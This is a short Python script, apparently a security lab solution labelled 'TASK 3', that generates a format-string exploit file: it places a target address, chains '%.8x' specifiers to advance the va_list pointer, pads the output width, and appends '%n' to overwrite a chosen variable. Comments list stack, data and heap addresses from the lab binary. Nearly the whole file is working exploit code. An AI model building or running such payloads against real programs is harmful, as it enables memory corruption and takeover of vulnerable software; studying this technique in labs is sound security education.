# hyper parameters
BADFILE_LENGTH = 1000
N_BYTES_PER_ADDRESS = 4

# create badfile with NOP (0x90)
badfile = bytearray(0x90 for _ in range(BADFILE_LENGTH))

"""TASK 3
Change target variable to some value
"""
# try to use the address of target_1 (local in fmttr) or target_2 (local in main) or target_3(global) and see the difference
# Address of target_1: 0xffffcfc4 (in stack)
# Address of target_2: 0xffffd3c8 (in stack)
# Address of target_3: 0x56559008 (in data segment)
# Address of target_4[0]: 0x5655a1a0 (in heap)
# Address of target_4[1]: 0x5655a1a4 (in heap)

target_address = 0xffffcfc4 # (1) address of the target variable we want to change
n_steps = 17 # (2) number of steps we need the va_list pointer to move (inferred via 2_badfile)

# address of the target
current_index = 0
badfile[current_index : current_index + 4] = target_address.to_bytes(4, byteorder="little")
current_index += 4

# multiple "%.8x" to move the va_list pointer
fmt = b"%.8x" * (n_steps - 1)
badfile[current_index : current_index + len(fmt)] = fmt
current_index += len(fmt)

# padding the output
target_value = 0xff # (3) any number larger than current_index
n_chars = 4 + 8 * (n_steps - 1)
fmt = f"%.{target_value - n_chars}x".encode()
badfile[current_index : current_index + len(fmt)] = fmt
current_index += len(fmt)

# append "%n" to modify the target value
badfile[current_index : current_index + 2] = b"%n"
current_index += 2

with open("3_badfile", "wb") as f:
    f.write(badfile[:current_index])
print("3_badfile is generated successfully!")